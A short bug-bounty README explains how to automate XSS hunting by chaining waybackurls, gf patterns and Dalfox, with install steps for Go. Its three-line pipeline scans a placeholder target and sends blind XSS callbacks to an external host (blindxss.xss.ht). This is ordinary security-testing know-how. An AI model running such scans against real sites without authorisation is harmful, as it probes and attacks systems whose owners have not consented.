# Automate XSS using Dalfox, WaybackURL, GF Patterns.

<b> Make sure you have Go installed on your Machine </b> 

### To Install Go on your Machine:

```
  1) sudo apt install -y golang
  2) export GOROOT=/usr/lib/go
  3) export GOPATH=$HOME/go
  4) export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
  5) source .bashrc
```

## How to Hunt XSS using Dalfox? 

- Use Waybackurls by Tomnomnom to Fetch URLS for Specific Target.
- Use GF patterns to find Possible XSS Vulnerable Parameters.
- Use Dalfox to find XSS.

* Steps :
```
   1) waybackurls target.com >> tee urls.txt
   2) cat urls.txt | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u |tee Possible_xss.txt 
   3) cat Possible_xss.txt | dalfox -b blindxss.xss.ht pipe 
```

## Tools Download Links:- 

* 1:- [Dalfox](https://github.com/hahwul/dalfox)
* 2:- [Waybackurls](https://github.com/tomnomnom/waybackurls)
* 3:- [GF](https://github.com/tomnomnom/gf)
* 4:- [GF Patterns](https://github.com/1ndianl33t/Gf-Patterns)

Find Script here : [QuickXSS](https://github.com/theinfosecguy/QuickXSS)


If you have any Questions, Reach out to me via [Twitter](https://twitter.com/g0t_rOoT_)
## Twitter : [Fani Malik](https://twitter.com/fanimalikhack)
